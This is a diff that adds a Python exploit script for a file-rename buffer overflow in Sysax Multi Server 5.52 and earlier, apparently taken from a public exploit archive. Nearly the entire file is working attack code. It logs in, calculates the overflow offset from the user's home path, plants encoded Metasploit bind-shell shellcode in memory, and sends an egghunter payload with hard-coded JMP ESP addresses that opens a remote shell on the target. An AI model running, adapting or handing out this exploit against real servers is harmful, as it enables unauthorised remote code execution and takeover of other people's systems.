@@ -1,0 +1,222 @@
+#!/usr/bin/python
+##########################################################################################################
+#Title: Sysax Multi Server <= 5.52 File Rename BoF RCE (Egghunter)
+#Author: Craig Freyman (@cd1zz)
+#Tested on: XP SP3 32bit and Server 2003 SP2 32bit(No DEP)
+#Software Versions Tested: 5.50 and 5.52
+#Date Discovered: Febrary 1, 2012
+#Vendor Contacted: Febrary 3, 2012
+#Vendor Response: (none)
+#A complete description of this exploit can be found here:
+#http://www.pwnag3.com/2012/02/sysax-multi-server-552-file-rename.html
+##########################################################################################################
+
+import socket,sys,time,re,base64
+
+if len(sys.argv) != 6:
+    print "[+] Usage: ./filename <Target IP> <Port> <User> <Password> <XP or 2K3>"
+    sys.exit(1)
+
+target = sys.argv[1]
+port = int(sys.argv[2])
+user = sys.argv[3]
+password = sys.argv[4]
+opersys = sys.argv[5]
+
+#base64 encode the provided creds
+creds = base64.encodestring(user+"\x0a"+password)
+
+#msfpayload  windows/shell_bind_tcp LPORT=4444 R|msfencode -e x86/alpha_mixed -b "\x00\x2f\x0a" 
+shell = ("DNWPDNWP"
+"\x89\xe3\xda\xc5\xd9\x73\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a"
+"\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59"
+"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41"
+"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
+"\x75\x4a\x49\x39\x6c\x58\x68\x6d\x59\x55\x50\x65\x50\x45"
+"\x50\x55\x30\x4e\x69\x39\x75\x55\x61\x39\x42\x61\x74\x4c"
+"\x4b\x51\x42\x50\x30\x6e\x6b\x73\x62\x36\x6c\x6e\x6b\x63"
+"\x62\x57\x64\x6c\x4b\x53\x42\x55\x78\x66\x6f\x6d\x67\x73"
+"\x7a\x37\x56\x45\x61\x4b\x4f\x45\x61\x6f\x30\x4c\x6c\x65"
+"\x6c\x61\x71\x33\x4c\x75\x52\x64\x6c\x45\x70\x79\x51\x38"
+"\x4f\x66\x6d\x63\x31\x58\x47\x7a\x42\x68\x70\x73\x62\x71"
+"\x47\x6c\x4b\x33\x62\x32\x30\x4c\x4b\x77\x32\x55\x6c\x36"
+"\x61\x58\x50\x6e\x6b\x71\x50\x62\x58\x6e\x65\x4b\x70\x33"
+"\x44\x61\x5a\x77\x71\x68\x50\x72\x70\x4c\x4b\x33\x78\x36"
+"\x78\x6e\x6b\x70\x58\x71\x30\x57\x71\x59\x43\x79\x73\x75"
+"\x6c\x43\x79\x6e\x6b\x34\x74\x6c\x4b\x47\x71\x6e\x36\x55"
+"\x61\x49\x6f\x56\x51\x6f\x30\x4c\x6c\x49\x51\x68\x4f\x34"
+"\x4d\x33\x31\x49\x57\x64\x78\x69\x70\x30\x75\x38\x74\x75"
+"\x53\x53\x4d\x6b\x48\x37\x4b\x71\x6d\x51\x34\x52\x55\x6a"
+"\x42\x33\x68\x4e\x6b\x42\x78\x75\x74\x43\x31\x6e\x33\x62"
+"\x46\x6e\x6b\x66\x6c\x32\x6b\x4e\x6b\x76\x38\x47\x6c\x77"
+"\x71\x68\x53\x4e\x6b\x65\x54\x4c\x4b\x57\x71\x78\x50\x4f"
+"\x79\x67\x34\x51\x34\x51\x34\x63\x6b\x61\x4b\x65\x31\x30"
+"\x59\x30\x5a\x53\x61\x39\x6f\x6d\x30\x33\x68\x31\x4f\x52"
+"\x7a\x6c\x4b\x65\x42\x68\x6b\x4c\x46\x63\x6d\x55\x38\x44"
+"\x73\x46\x52\x63\x30\x33\x30\x35\x38\x42\x57\x30\x73\x50"
+"\x32\x73\x6f\x50\x54\x31\x78\x52\x6c\x34\x37\x44\x66\x44"
+"\x47\x59\x6f\x6e\x35\x6e\x58\x6e\x70\x77\x71\x55\x50\x55"
+"\x50\x46\x49\x49\x54\x46\x34\x42\x70\x61\x78\x51\x39\x6f"
+"\x70\x50\x6b\x53\x30\x59\x6f\x49\x45\x50\x50\x50\x50\x36"
+"\x30\x72\x70\x51\x50\x32\x70\x57\x30\x72\x70\x43\x58\x38"
+"\x6a\x34\x4f\x79\x4f\x6b\x50\x79\x6f\x39\x45\x6d\x59\x79"
+"\x57\x50\x31\x49\x4b\x51\x43\x65\x38\x43\x32\x45\x50\x72"
+"\x31\x73\x6c\x6c\x49\x49\x76\x32\x4a\x34\x50\x76\x36\x72"
+"\x77\x45\x38\x5a\x62\x4b\x6b\x55\x67\x63\x57\x79\x6f\x38"
+"\x55\x71\x43\x51\x47\x43\x58\x4f\x47\x59\x79\x64\x78\x69"
+"\x6f\x59\x6f\x7a\x75\x36\x33\x70\x53\x51\x47\x65\x38\x61"
+"\x64\x78\x6c\x67\x4b\x69\x71\x49\x6f\x48\x55\x70\x57\x6f"
+"\x79\x49\x57\x63\x58\x42\x55\x50\x6e\x72\x6d\x55\x31\x79"
+"\x6f\x39\x45\x33\x58\x63\x53\x72\x4d\x35\x34\x77\x70\x4e"
+"\x69\x79\x73\x76\x37\x73\x67\x62\x77\x46\x51\x7a\x56\x31"
+"\x7a\x57\x62\x76\x39\x46\x36\x4b\x52\x39\x6d\x42\x46\x38"
+"\x47\x62\x64\x61\x34\x47\x4c\x45\x51\x57\x71\x4c\x4d\x47"
+"\x34\x76\x44\x44\x50\x79\x56\x63\x30\x53\x74\x33\x64\x70"
+"\x50\x53\x66\x42\x76\x52\x76\x53\x76\x76\x36\x30\x4e\x71"
+"\x46\x32\x76\x36\x33\x62\x76\x53\x58\x44\x39\x48\x4c\x57"
+"\x4f\x6e\x66\x69\x6f\x79\x45\x6f\x79\x6d\x30\x30\x4e\x32"
+"\x76\x63\x76\x49\x6f\x56\x50\x42\x48\x65\x58\x6d\x57\x45"
+"\x4d\x31\x70\x79\x6f\x38\x55\x4d\x6b\x78\x70\x4d\x65\x69"
+"\x32\x30\x56\x50\x68\x4f\x56\x4a\x35\x4d\x6d\x6f\x6d\x49"
+"\x6f\x39\x45\x55\x6c\x66\x66\x43\x4c\x56\x6a\x4d\x50\x69"
+"\x6b\x59\x70\x64\x35\x74\x45\x6f\x4b\x53\x77\x55\x43\x43"
+"\x42\x42\x4f\x43\x5a\x55\x50\x52\x73\x79\x6f\x68\x55\x41"
+"\x41")
+
+egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x44\x4e\x57\x50\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
+ 
+print "============================================================================"
+print "                 Sysax Multi Server <= 5.52 File Rename BoF                    "
+print "                                  by cd1zz                                   "
+print "                               www.pwnag3.com                                "
+print "         Launching exploit against " + target + " on port " + str(port) + " for " + opersys
+print "============================================================================"
+
+#login with encoded creds
+login = "POST /scgi?sid=0&pid=dologin HTTP/1.1\r\n"
+login += "Host: \r\n"
+login += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\r\n"
+login += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+login += "Accept-Language: en-us,en;q=0.5\r\n"
+login += "Accept-Encoding: gzip, deflate\r\n"
+login += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
+login += "Proxy-Connection: keep-alive\r\n"
+login += "http://"+target+"/scgi?sid=0&pid=dologin\r\n"
+login += "Content-Type: application/x-www-form-urlencoded\r\n"
+login += "Content-Length: 15\r\n\r\n"
+login += "fd="+creds
+
+#grab the sid
+r = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+r.connect((target, port))
+print "[*] Getting your SID."
+r.send(login + "\r\n")
+page = r.recv(10240)
+sid = re.search(r'sid=[a-zA-Z0-9]{40}',page,re.M)
+if sid is None:
+	print "[X] Could not get a SID. User and pass correct?"
+	sys.exit(1)
+print "[+] Your " + sid.group(0)
+time.sleep(2)
+
+#find the users path to calc offset
+print "[*] Finding home path to calculate offset."
+path = re.search(r'file=[a-zA-Z0-9]:\\[\\.a-zA-Z_0-9 ]{1,255}[\\$]',page,re.M)
+time.sleep(1)
+
+#if that doesnt work, try to upload a file and check again
+if path is None:
+	print "[-] There are no files in your path so I'm going to try to upload one for you."
+	print "[-] If you don't have rights to do this, it will fail."
+
+	upload = "POST /scgi?"+str(sid.group(0))+"&pid=uploadfile_name1.htm HTTP/1.1\r\n"
+	upload += "Host:\r\n"
+	upload += "Content-Type: multipart/form-data; boundary=---------------------------97336096252362005297691620\r\n"
+	upload += "Content-Length: 219\r\n\r\n"
+	upload += "-----------------------------97336096252362005297691620\r\n"
+	upload += "Content-Disposition: form-data; name=\"upload_file\"; filename=\"file.txt\"\r\n"
+	upload += "Content-Type: text/plain\r\n"
+	upload += "-----------------------------97336096252362005297691620--\r\n\r\n"
+
+	u = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	u.connect((target, port))
+	u.send(upload + "\r\n")
+	page = u.recv(10240)
+        path = re.search(r'file=[a-zA-Z0-9]:\\[\\.a-zA-Z_0-9 ]{1,255}[\\$]',page,re.M)
+	time.sleep(2)
+	if path is None:
+		print "[X] It failed, you probably don't have rights to upload."
+		print "[X] You will need to get your path another way to properly calculate the offset."
+		sys.exit(1)
+	
+print "[+] Got it ==> " + path.group(0) 
+time.sleep(1)
+
+#subtract --> file=c:\ <--- (8 bytes) from the length and minus one more for the trailing --> \
+pathlength = len(path.group(0)) - 8 - 1
+#print "[*] The path is " + str(pathlength) + " bytes long (not including C:\)."
+if pathlength < 16:
+	print "[X] Your path is too short, this will just DoS the server."
+	print "[X] The path has to be at least 16 bytes long or we cant jump to our buffer."
+	sys.exit(1)
+time.sleep(2)
+r.close()
+
+#jump back 128 bytes
+jumpback = "\xeb\x80"
+
+#No DEP bypass
+if opersys == "2K3":
+	#2043 is the offset for c:\A
+	offset = 2044 - pathlength
+	padding = "\x90" * 10
+	junk = "\x41" * (offset - len(egghunter+padding))
+	jump = "\xa4\xde\x8e\x7c" 	#JMP ESP
+	buf = junk + egghunter + padding + jump + "\x90"*12 + jumpback + "D"*10
+ 
+if opersys == "XP":
+	#2044 is the offset for c:\A 
+	offset = 2044 - pathlength
+	padding = "\x90" * 10
+	junk = "\x41" * (offset - len(egghunter+padding))
+	jump = "\x53\x93\x42\x7e" 	#JMP ESP
+	buf = junk + egghunter + padding + jump + "\x90"*12 + jumpback + "D"*10
+
+#print "[*] Your offset is " + str(offset)
+	
+#we'll stuff our shell in memory first
+stage1 = "POST /scgi?"+str(sid.group(0))+"&pid="+shell+"mk_folder2_name1.htm HTTP/1.1\r\n"
+stage1 += "Host: \r\n"
+stage1 += "Referer: http://"+target+"/scgi?sid="+str(sid.group(0))+"&pid=mk_folder1_name1.htm\r\n"
+stage1 += "Content-Type: multipart/form-data; boundary=---------------------------1190753071675116720811342231\r\n"
+stage1 += "Content-Length: 171\r\n\r\n"
+stage1 += "-----------------------------1190753071675116720811342231\r\n"
+stage1 += "Content-Disposition: form-data; name=\"e2\"\r\n\r\n"
+stage1 += "file_test\r\n"
+stage1 += "-----------------------------1190753071675116720811342231--\r\n\r\n"
+
+#this is the bof
+stage2 = "POST /scgi?"+str(sid.group(0))+"&pid=rnmslctd1_name1.htm HTTP/1.1\r\n"
+stage2 += "Host: \r\n"
+stage2 += "Referrer: http://"+target+"/scgi?sid=0&pid=dologin\r\n"
+stage2 += "Content-Type: multipart/form-data; boundary=---------------------------332173112583677792048824791\r\n"
+stage2 += "Content-Length: 183\r\n\r\n"
+stage2 += "-----------------------------332173112583677792048824791\r\n"
+stage2 += "Content-Disposition: form-data; name=\"e2\"\r\n\r\n"
+stage2 += "file_"+buf+"\r\n\r\n"
+stage2 += "-----------------------------332173112583677792048824791--\r\n\r\n"
+  
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((target, port))
+print "[*] Sending stage 1 shell."
+s.send(stage1 + "\r\n")
+time.sleep(3)
+##Dont close the socket or we'll lose our stage 1 shell in memory
+##s.close()
+
+t = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+t.connect((target, port))
+print "[*] Sending stage 2 BoF."
+t.send(stage2 + "\r\n")
+print "[*] Go get your shell..."
+t.recv(2048)
